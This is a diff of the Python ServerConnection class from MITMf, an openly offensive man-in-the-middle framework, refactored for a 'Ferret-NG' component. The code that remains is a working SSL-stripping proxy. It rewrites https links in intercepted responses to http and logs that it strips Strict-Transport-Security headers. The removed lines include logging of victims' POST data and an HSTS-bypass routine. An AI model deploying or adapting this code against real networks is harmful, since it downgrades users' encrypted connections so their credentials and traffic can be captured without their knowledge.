@@ -25,10 +25,8 @@ import gzip
 import StringIO
 import sys
 
-from user_agents import parse
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
-from core.sergioproxy.ProxyPlugins import ProxyPlugins
 
 mitmf_logger = logging.getLogger('mitmf')
 
@@ -55,12 +53,8 @@ class ServerConnection(HTTPClient):
         self.postData         = postData
         self.headers          = headers
         self.client           = client
-        self.printPostData    = True
         self.clientInfo       = None
         self.urlMonitor       = URLMonitor.getInstance()
-        self.hsts             = URLMonitor.getInstance().hsts
-        self.app              = URLMonitor.getInstance().app
-        self.plugins          = ProxyPlugins.getInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
@@ -71,41 +65,24 @@ class ServerConnection(HTTPClient):
 
     def sendRequest(self):
         if self.command == 'GET':
-            try:
-                user_agent = parse(self.headers['user-agent'])
-                self.clientInfo = "{} [type:{}-{} os:{}] ".format(self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
-            except Exception as e:
-                mitmf_logger.debug("[ServerConnection] Failed to parse client UA: {}".format(e))
-                self.clientInfo = "{} ".format(self.client.getClientIP())
 
-            mitmf_logger.info(self.clientInfo + "Sending Request: {}".format(self.headers['host']))
-            mitmf_logger.debug("[ServerConnection] Full request: {}{}".format(self.headers['host'], self.uri))
+            mitmf_logger.debug(self.client.getClientIP() + " [Ferret-NG] Sending Request: {}".format(self.headers['host']))
 
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
         for header, value in self.headers.iteritems():
-            mitmf_logger.debug("[ServerConnection] Sending header: ({}: {})".format(header, value))
+            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Sending header: ({}: {})".format(header, value))
             self.sendHeader(header, value)
 
         self.endHeaders()
 
     def sendPostData(self):
-        if self.printPostData is True: #So we can disable printing POST data coming from plugins 
-            try:
-                postdata = self.postData.decode('utf8') #Anything that we can't decode to utf-8 isn't worth logging
-                if len(postdata) > 0:
-                    mitmf_logger.warning("{} {} Data ({}):\n{}".format(self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], postdata))
-            except UnicodeDecodeError and UnicodeEncodeError:
-                mitmf_logger.debug("[ServerConnection] {} Ignored post data from {}".format(self.client.getClientIP(), self.headers['host']))
-                pass
 
-        self.printPostData = True
         self.transport.write(self.postData)
 
     def connectionMade(self):
-        mitmf_logger.debug("[ServerConnection] HTTP connection made.")
-        self.plugins.hook()
+        mitmf_logger.debug("[Ferret-NG] [ServerConnection] HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
         
@@ -113,27 +90,25 @@ class ServerConnection(HTTPClient):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
-        mitmf_logger.debug("[ServerConnection] Server response: {} {} {}".format(version, code, message))
+        mitmf_logger.debug("[Ferret-NG] [ServerConnection] Server response: {} {} {}".format(version, code, message))
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
-            if self.app:
-                self.urlMonitor.addRedirection(self.client.uri, value)
 
         if (key.lower() == 'content-type'):
             if (value.find('image') != -1):
                 self.isImageRequest = True
-                mitmf_logger.debug("[ServerConnection] Response is image content, not scanning")
+                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Response is image content, not scanning")
 
         if (key.lower() == 'content-encoding'):
             if (value.find('gzip') != -1):
-                mitmf_logger.debug("[ServerConnection] Response is compressed")
+                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Response is compressed")
                 self.isCompressed = True
 
         elif (key.lower()== 'strict-transport-security'):
-            mitmf_logger.info("{} Zapped a strict-trasport-security header".format(self.clientInfo))
+            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Zapped a strict-trasport-security header")
 
         elif (key.lower() == 'content-length'):
             self.contentLength = value
@@ -151,11 +126,9 @@ class ServerConnection(HTTPClient):
         if self.length == 0:
             self.shutdown()
 
-        self.plugins.hook()
-
         if logging.getLevelName(mitmf_logger.getEffectiveLevel()) == "DEBUG":
             for header, value in self.client.headers.iteritems():
-                mitmf_logger.debug("[ServerConnection] Receiving header: ({}: {})".format(header, value)) 
+                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Receiving header: ({}: {})".format(header, value)) 
 
     def handleResponsePart(self, data):
         if (self.isImageRequest):
@@ -174,13 +147,12 @@ class ServerConnection(HTTPClient):
 
     def handleResponse(self, data):
         if (self.isCompressed):
-            mitmf_logger.debug("[ServerConnection] Decompressing content...")
+            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
 
         data = self.replaceSecureLinks(data)
-        data = self.plugins.hook()['data']
 
-        mitmf_logger.debug("[ServerConnection] Read from server {} bytes of data".format(len(data)))
+        mitmf_logger.debug("[Ferret-NG] [ServerConnection] Read from server {} bytes of data".format(len(data)))
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
@@ -193,57 +165,23 @@ class ServerConnection(HTTPClient):
         try:
             self.shutdown()
         except:
-            mitmf_logger.info("[ServerConnection] Client connection dropped before request finished.")
+            mitmf_logger.info("[Ferret-NG] [ServerConnection] Client connection dropped before request finished.")
 
     def replaceSecureLinks(self, data):
-        if self.hsts:
 
-            sustitucion = {}
-            patchDict = self.urlMonitor.patchDict
+        iterator = re.finditer(ServerConnection.urlExpression, data)
 
-            if len(patchDict)>0:
-                dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
-                data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
+        for match in iterator:
+            url = match.group()
 
-            iterator = re.finditer(ServerConnection.urlExpression, data)       
-            for match in iterator:
-                url = match.group()
+            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Found secure reference: " + url)
 
-                mitmf_logger.debug("[ServerConnection][HSTS] Found secure reference: " + url)
-                nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-                mitmf_logger.debug("[ServerConnection][HSTS] Replacing {} => {}".format(url,nuevaurl))
-                sustitucion[url] = nuevaurl
-                #data.replace(url,nuevaurl)
+            url = url.replace('https://', 'http://', 1)
+            url = url.replace('&amp;', '&')
+            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
 
-            #data = self.urlMonitor.DataReemplazo(data)
-            if len(sustitucion)>0:
-                dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
-                data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
-
-            #mitmf_logger.debug("HSTS DEBUG received data:\n"+data)   
-            #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
-            #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
-            #if data.find("http://w.face")!=-1:
-            #   mitmf_logger.debug("HSTS DEBUG Found error in modifications")
-            #   raw_input("Press Enter to continue")
-            #return re.sub(ServerConnection.urlType, 'http://web.', data)
-            return data
-
-        else:
-
-            iterator = re.finditer(ServerConnection.urlExpression, data)
-
-            for match in iterator:
-                url = match.group()
-
-                mitmf_logger.debug("[ServerConnection] Found secure reference: " + url)
-
-                url = url.replace('https://', 'http://', 1)
-                url = url.replace('&amp;', '&')
-                self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-
-            data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-            return re.sub(ServerConnection.urlType, 'http://', data)
+        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+        return re.sub(ServerConnection.urlType, 'http://', data)
 
     def shutdown(self):
         if not self.shutdownComplete:
